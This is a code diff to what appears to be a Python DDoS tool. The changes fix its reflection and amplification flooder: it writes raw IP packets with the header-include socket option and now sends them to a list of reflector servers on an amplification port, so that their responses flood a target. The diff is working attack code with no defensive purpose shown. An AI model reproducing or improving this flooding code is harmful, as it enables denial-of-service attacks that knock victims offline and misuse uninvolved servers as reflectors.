@@ -55,6 +55,9 @@ except OSError:
 
 basicConfig(format="[%(asctime)s - %(levelname)s] %(message)s", datefmt="%H:%M:%S")
 
+Dest = Tuple[str, int]
+PacketData = Tuple[bytes, Dest]
+
 
 # xxx(okachaiev): try out "hummanize" package
 def humanbytes(i: int, binary: bool = False, precision: int = 2):
@@ -523,14 +526,14 @@ async def flood_ampl_packates_gen(
     ctx: Context,
     fid: int,
     target: Target,
-    packets: Generator[bytes, None, None]
+    packets: Generator[PacketData, None, None]
 ):
     async with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP) as sock:
         sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
         async with curio.meta.finalize(packets) as packets:
-            async for payload in packets:
+            async for (payload, dest) in packets:
                 try:
-                    sent = await sock.sendto(payload, (target.addr, target.port))
+                    sent = await sock.sendto(payload, dest)
                     ctx.track_packet_sent(fid, target, len(payload))
                     if sent == 0: return
                 except OSError as exc:
@@ -569,7 +572,14 @@ async def UDP(ctx: Context, fid: int, target: Target):
                     ctx.track_error(exc)
 
 
-def ampl_packets_gen(reflectors: List[str], target: Target, payload: bytes, ampl_port: int):
+
+
+def ampl_packets_gen(
+    reflectors: List[str],
+    target: Target,
+    payload: bytes,
+    ampl_port: int
+) -> Generator[PacketData, None, None]:
     def gen():
         for ref in reflectors:
             packet = IP()
@@ -582,7 +592,7 @@ def ampl_packets_gen(reflectors: List[str], target: Target, payload: bytes, ampl
             content.contains(Data(payload))
         
             packet.contains(content)
-            yield packet
+            yield packet.get_packet(), (ref, ampl_port)
 
     return cycle(gen())
 
